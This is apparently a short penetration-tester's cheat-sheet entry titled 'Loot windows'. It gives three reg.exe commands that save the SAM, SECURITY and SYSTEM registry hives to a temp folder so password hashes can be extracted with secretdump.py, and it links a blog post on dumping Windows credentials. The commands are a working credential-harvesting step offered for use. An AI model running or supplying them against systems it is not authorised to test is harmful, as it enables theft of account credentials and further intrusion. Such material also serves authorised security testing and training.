# Loot windows - For credentials and other stuff

This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries.
Get the registry:

```
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```

The hashes can be extracted using secretdump.py. 

## References

This is a great post
https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/